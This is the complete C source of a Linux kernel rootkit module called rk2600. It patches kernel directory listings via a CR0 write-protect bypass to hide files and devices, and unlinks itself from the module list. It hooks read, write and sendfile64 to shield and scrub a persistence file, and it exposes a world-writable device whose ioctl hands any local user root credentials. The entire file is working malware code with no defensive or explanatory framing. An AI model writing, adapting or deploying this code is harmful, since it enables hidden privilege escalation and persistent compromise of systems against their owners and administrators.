#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/spinlock.h>
#include <linux/proc_fs.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <linux/dcache.h>
#include <linux/path.h>
#include <linux/file.h>
#include <linux/namei.h>
#include <asm/processor-flags.h>

#include "rk2600_protocol.h"

/* ---------------------------------------------------------------- hidden list */

struct hidden_entry {
	struct list_head list;
	char name[RK2600_NAME_MAX + 1];
};

static LIST_HEAD(hidden_names);
static DEFINE_SPINLOCK(hidden_lock);

static bool name_is_hidden(const char *name, int namlen)
{
	struct hidden_entry *e;
	bool found = false;

	spin_lock(&hidden_lock);
	list_for_each_entry(e, &hidden_names, list) {
		if ((int)strlen(e->name) == namlen &&
		    memcmp(e->name, name, namlen) == 0) {
			found = true;
			break;
		}
	}
	spin_unlock(&hidden_lock);
	return found;
}

static int hide_name(const char *name)
{
	struct hidden_entry *e;
	struct hidden_entry *new_entry;

	new_entry = kzalloc(sizeof(*new_entry), GFP_KERNEL);
	if (!new_entry)
		return -ENOMEM;
	strscpy(new_entry->name, name, sizeof(new_entry->name));

	spin_lock(&hidden_lock);
	list_for_each_entry(e, &hidden_names, list) {
		if (strcmp(e->name, name) == 0) {
			spin_unlock(&hidden_lock);
			kfree(new_entry);
			return 0;
		}
	}
	list_add_tail(&new_entry->list, &hidden_names);
	spin_unlock(&hidden_lock);
	return 0;
}

static int show_name(const char *name)
{
	struct hidden_entry *e, *tmp;

	spin_lock(&hidden_lock);
	list_for_each_entry_safe(e, tmp, &hidden_names, list) {
		if (strcmp(e->name, name) == 0) {
			list_del(&e->list);
			spin_unlock(&hidden_lock);
			kfree(e);
			return 0;
		}
	}
	spin_unlock(&hidden_lock);
	return -ENOENT;
}

static void flush_hidden(void)
{
	struct hidden_entry *e, *tmp;
	LIST_HEAD(freelist);

	spin_lock(&hidden_lock);
	list_splice_init(&hidden_names, &freelist);
	spin_unlock(&hidden_lock);

	list_for_each_entry_safe(e, tmp, &freelist, list) {
		list_del(&e->list);
		kfree(e);
	}
}

/* -------------------------------------------------------- write-protect bypass */

static inline unsigned long wp_disable(void)
{
	unsigned long cr0;

	preempt_disable();
	asm volatile("mov %%cr0, %0" : "=r"(cr0));
	asm volatile("mov %0, %%cr0" : : "r"(cr0 & ~X86_CR0_WP) : "memory");
	return cr0;
}

static inline void wp_restore(unsigned long cr0)
{
	asm volatile("mov %0, %%cr0" : : "r"(cr0) : "memory");
	preempt_enable();
}

/* -------------------------------------------------------- directory hook infra */

struct dir_hook {
	const char              *path;
	struct file_operations  *fops;
	int (*orig_iterate)(struct file *, struct dir_context *);
	int (*hooked_iterate)(struct file *, struct dir_context *);
};

struct rk_dir_ctx {
	struct dir_context  ctx;
	struct dir_context *real;
};

static int install_dir_hook(struct dir_hook *h)
{
	struct file *f;
	unsigned long cr0;

	f = filp_open(h->path, O_RDONLY | O_DIRECTORY, 0);
	if (IS_ERR(f))
		return PTR_ERR(f);

	h->fops = (struct file_operations *)f->f_op;
	h->orig_iterate = h->fops->iterate_shared;

	cr0 = wp_disable();
	h->fops->iterate_shared = h->hooked_iterate;
	wp_restore(cr0);

	filp_close(f, NULL);
	return 0;
}

static void remove_dir_hook(struct dir_hook *h)
{
	unsigned long cr0;

	if (!h->fops || !h->orig_iterate)
		return;
	cr0 = wp_disable();
	h->fops->iterate_shared = h->orig_iterate;
	wp_restore(cr0);
}

#define DEFINE_DIR_ITERATE(fn_name, filldir_fn, hook_ref)		\
static int fn_name(struct file *file, struct dir_context *ctx)		\
{									\
	struct rk_dir_ctx rk = {					\
		.ctx.actor = filldir_fn,				\
		.ctx.pos   = ctx->pos,					\
		.real      = ctx,					\
	};								\
	int ret;							\
									\
	ret = (hook_ref).orig_iterate(file, &rk.ctx);			\
	ctx->pos = rk.ctx.pos;						\
	return ret;							\
}

static int rk_root_iterate(struct file *, struct dir_context *);
static int rk_proc_iterate(struct file *, struct dir_context *);
static int rk_dev_iterate(struct file *, struct dir_context *);

static struct dir_hook root_hook = {
	.path = "/", .hooked_iterate = rk_root_iterate
};
static struct dir_hook proc_hook = {
	.path = "/proc", .hooked_iterate = rk_proc_iterate
};
static struct dir_hook dev_hook = {
	.path = "/dev", .hooked_iterate = rk_dev_iterate
};

/* --------------------------------------------------------- filldir callback */

static bool rk_filldir(struct dir_context *ctx, const char *name,
		       int namlen, loff_t offset, u64 ino,
		       unsigned int d_type)
{
	struct rk_dir_ctx *rk = container_of(ctx, struct rk_dir_ctx, ctx);

	if (name_is_hidden(name, namlen))
		return true;

	return rk->real->actor(rk->real, name, namlen, offset, ino, d_type);
}

DEFINE_DIR_ITERATE(rk_root_iterate, rk_filldir, root_hook)
DEFINE_DIR_ITERATE(rk_proc_iterate, rk_filldir, proc_hook)
DEFINE_DIR_ITERATE(rk_dev_iterate,  rk_filldir, dev_hook)

/* ----------------------------------------------------------- module hiding */

static struct list_head *saved_prev;
static bool mod_hidden;

static void do_hide_module(void)
{
	if (mod_hidden)
		return;
	saved_prev = THIS_MODULE->list.prev;
	list_del_init(&THIS_MODULE->list);
	mod_hidden = true;
}

static void do_show_module(void)
{
	if (!mod_hidden)
		return;
	list_add(&THIS_MODULE->list, saved_prev);
	mod_hidden = false;
}

/* -------------------------------------------------------- privilege escalation */

static int do_elevate(void)
{
	struct cred *new;

	new = prepare_kernel_cred(NULL);
	if (!new)
		return -ENOMEM;
	return commit_creds(new);
}

/* ------------------------------------------------------------ syscall hooks */

typedef unsigned long (*kallsyms_lookup_name_fn)(const char *name);
typedef asmlinkage long (*sys_call_fn)(const struct pt_regs *);

static sys_call_fn orig_sys_read;
static sys_call_fn orig_sys_write;
static sys_call_fn orig_sys_sendfile64;

static dev_t persist_dev;
static unsigned long persist_ino;

static void resolve_persist_file(void)
{
	struct path p;

	if (kern_path(RK2600_PERSIST_PATH, LOOKUP_FOLLOW, &p) == 0) {
		persist_ino = d_inode(p.dentry)->i_ino;
		persist_dev = d_inode(p.dentry)->i_sb->s_dev;
		path_put(&p);
	}
}

static bool fd_is_persist(int fd)
{
	struct file *f;
	bool match;

	if (!persist_ino) {
		resolve_persist_file();
		if (!persist_ino)
			return false;
	}

	f = fget(fd);
	if (!f)
		return false;

	match = f->f_inode->i_ino == persist_ino &&
		f->f_inode->i_sb->s_dev == persist_dev;
	fput(f);
	return match;
}

static void filter_persist_buf(char __user *ubuf, long *len)
{
	char *kbuf;
	char *out;
	char *p;
	long klen = *len;
	long outlen = 0;

	kbuf = kmalloc(klen + 1, GFP_KERNEL);
	if (!kbuf)
		return;
	out = kmalloc(klen + 1, GFP_KERNEL);
	if (!out) {
		kfree(kbuf);
		return;
	}

	if (copy_from_user(kbuf, ubuf, klen))
		goto out_free;

	kbuf[klen] = '\0';
	p = kbuf;

	while (p < kbuf + klen) {
		size_t remaining = (size_t)(kbuf + klen - p);
		char *nl = memchr(p, '\n', remaining);
		size_t linelen = nl ? (size_t)(nl - p + 1) : remaining;

		if (!strnstr(p, "insmod", linelen) &&
		    !strnstr(p, RK2600_MODULE_NAME, linelen)) {
			memcpy(out + outlen, p, linelen);
			outlen += linelen;
		}
		p += linelen;
	}

	if (copy_to_user(ubuf, out, outlen) == 0)
		*len = outlen;

out_free:
	kfree(out);
	kfree(kbuf);
}

static asmlinkage long rk_sys_read(const struct pt_regs *);
static asmlinkage long rk_sys_write(const struct pt_regs *);
static asmlinkage long rk_sys_sendfile64(const struct pt_regs *);

struct ftrace_hook {
	const char        *name;
	void              *hook_fn;
	sys_call_fn       *orig_fn;
	unsigned long      address;
	struct ftrace_ops  ops;
};

static void notrace fh_callback(unsigned long ip, unsigned long parent_ip,
				struct ftrace_ops *ops,
				struct ftrace_regs *fregs)
{
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
	struct pt_regs *regs = ftrace_get_regs(fregs);

	if (!regs)
		return;
	if (within_module(parent_ip, THIS_MODULE))
		return;

	regs->ip = (unsigned long)hook->hook_fn;
}

static int install_one_hook(struct ftrace_hook *hook,
			    kallsyms_lookup_name_fn klnfn)
{
	int ret;

	hook->address = klnfn(hook->name);
	if (!hook->address)
		return -ENOENT;

	*hook->orig_fn = (sys_call_fn)hook->address;

	hook->ops.func = fh_callback;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
			| FTRACE_OPS_FL_IPMODIFY;

	ret = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
	if (ret)
		return ret;

	ret = register_ftrace_function(&hook->ops);
	if (ret) {
		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
		return ret;
	}

	return 0;
}

static void remove_one_hook(struct ftrace_hook *hook)
{
	if (!hook->address)
		return;
	unregister_ftrace_function(&hook->ops);
	ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
}

static struct ftrace_hook hooks[] = {
	{ .name = "__x64_sys_read",  .hook_fn = rk_sys_read,
	  .orig_fn = &orig_sys_read },
	{ .name = "__x64_sys_write", .hook_fn = rk_sys_write,
	  .orig_fn = &orig_sys_write },
	{ .name = "__x64_sys_sendfile64", .hook_fn = rk_sys_sendfile64,
	  .orig_fn = &orig_sys_sendfile64 },
};

static asmlinkage long rk_sys_read(const struct pt_regs *regs)
{
	long ret = orig_sys_read(regs);

	asm volatile("" : "+r"(ret));

	if (ret > 0 && fd_is_persist((int)regs->di))
		filter_persist_buf((char __user *)regs->si, &ret);

	return ret;
}

static asmlinkage long rk_sys_write(const struct pt_regs *regs)
{
	long ret;

	if (fd_is_persist((int)regs->di))
		return (long)regs->dx;

	ret = orig_sys_write(regs);
	asm volatile("" : "+r"(ret));
	return ret;
}

static asmlinkage long rk_sys_sendfile64(const struct pt_regs *regs)
{
	long ret;
	int in_fd = (int)regs->si;

	if (fd_is_persist(in_fd))
		return -EINVAL;

	ret = orig_sys_sendfile64(regs);
	asm volatile("" : "+r"(ret));
	return ret;
}

static int install_syscall_hooks(void)
{
	struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
	kallsyms_lookup_name_fn klnfn;
	int ret;
	int i;

	ret = register_kprobe(&kp);
	if (ret)
		return ret;
	klnfn = (kallsyms_lookup_name_fn)kp.addr;
	unregister_kprobe(&kp);

	for (i = 0; i < ARRAY_SIZE(hooks); i++) {
		ret = install_one_hook(&hooks[i], klnfn);
		if (ret)
			goto err;
	}

	return 0;

err:
	while (i-- > 0)
		remove_one_hook(&hooks[i]);
	return ret;
}

static void remove_syscall_hooks(void)
{
	int i;

	for (i = ARRAY_SIZE(hooks) - 1; i >= 0; i--)
		remove_one_hook(&hooks[i]);
}

/* ------------------------------------------------------------- ioctl handler */

static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
	struct rk2600_name_request req;
	struct rk2600_status st;

	switch (cmd) {
	case RK2600_IOC_ELEVATE:
		return do_elevate();

	case RK2600_IOC_STATUS:
		st.api_version = RK2600_API_VERSION;
		st.flags = mod_hidden ? RK2600_FLAG_HIDDEN : 0;
		if (copy_to_user((void __user *)arg, &st, sizeof(st)))
			return -EFAULT;
		return 0;

	case RK2600_IOC_HIDE:
		if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
			return -EFAULT;
		req.name[RK2600_NAME_MAX] = '\0';
		if (req.name[0] == '\0')
			return -EINVAL;
		return hide_name(req.name);

	case RK2600_IOC_UNHIDE:
		if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
			return -EFAULT;
		req.name[RK2600_NAME_MAX] = '\0';
		if (req.name[0] == '\0')
			return -EINVAL;
		return show_name(req.name);

	case RK2600_IOC_MODHIDE:
		do_hide_module();
		return 0;

	case RK2600_IOC_MODSHOW:
		do_show_module();
		return 0;

	default:
		return -ENOTTY;
	}
}

/* ---------------------------------------------------------- /proc/.rk writer */

static struct proc_dir_entry *proc_entry;

static ssize_t proc_rk_write(struct file *file, const char __user *ubuf,
			      size_t count, loff_t *ppos)
{
	char buf[RK2600_NAME_MAX + 2];
	size_t len;
	int ret;

	if (count == 0 || count > sizeof(buf) - 1)
		return -EINVAL;
	if (copy_from_user(buf, ubuf, count))
		return -EFAULT;

	buf[count] = '\0';
	len = count;
	if (len > 0 && buf[len - 1] == '\n')
		buf[--len] = '\0';
	if (len == 0)
		return -EINVAL;

	if (strcmp(buf, "flush") == 0) {
		flush_hidden();
		return (ssize_t)count;
	}
	if (strcmp(buf, "hide") == 0) {
		do_hide_module();
		return (ssize_t)count;
	}
	if (strcmp(buf, "unhide") == 0) {
		do_show_module();
		return (ssize_t)count;
	}
	if (buf[0] == '+' && len > 1) {
		ret = hide_name(buf + 1);
		return ret < 0 ? ret : (ssize_t)count;
	}
	if (buf[0] == '-' && len > 1) {
		ret = show_name(buf + 1);
		return ret < 0 ? ret : (ssize_t)count;
	}

	return -EINVAL;
}

static const struct proc_ops proc_rk_ops = {
	.proc_write = proc_rk_write,
};

/* --------------------------------------------------------------- misc device */

static const struct file_operations rk_fops = {
	.owner          = THIS_MODULE,
	.unlocked_ioctl = rk_ioctl,
};

static struct miscdevice rk_dev = {
	.minor = MISC_DYNAMIC_MINOR,
	.name  = RK2600_DEVICE_NAME,
	.fops  = &rk_fops,
	.mode  = 0666,
};

/* ---------------------------------------------------------- module init/exit */

static int __init rk_init(void)
{
	int ret;

	ret = misc_register(&rk_dev);
	if (ret)
		return ret;

	ret = install_dir_hook(&root_hook);
	if (ret)
		goto err_dev;

	proc_entry = proc_create(RK2600_PROC_NAME, 0200, NULL, &proc_rk_ops);
	if (!proc_entry) {
		ret = -ENOMEM;
		goto err_root;
	}

	ret = install_dir_hook(&proc_hook);
	if (ret)
		goto err_proc;

	ret = install_dir_hook(&dev_hook);
	if (ret)
		goto err_proc_hook;

	ret = install_syscall_hooks();
	if (ret)
		goto err_dev_hook;

	resolve_persist_file();

	hide_name(RK2600_PERSIST_NAME);
	hide_name(RK2600_MODULE_FILE);
	hide_name(RK2600_MODULE_NAME);
	hide_name(RK2600_PROC_NAME);
	hide_name(RK2600_DEVICE_NAME);

	do_hide_module();

	return 0;

err_dev_hook:
	remove_dir_hook(&dev_hook);
err_proc_hook:
	remove_dir_hook(&proc_hook);
err_proc:
	proc_remove(proc_entry);
err_root:
	remove_dir_hook(&root_hook);
err_dev:
	misc_deregister(&rk_dev);
	return ret;
}

static void __exit rk_exit(void)
{
	remove_syscall_hooks();
	remove_dir_hook(&dev_hook);
	remove_dir_hook(&proc_hook);
	proc_remove(proc_entry);
	remove_dir_hook(&root_hook);
	flush_hidden();
	misc_deregister(&rk_dev);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("rk2600");
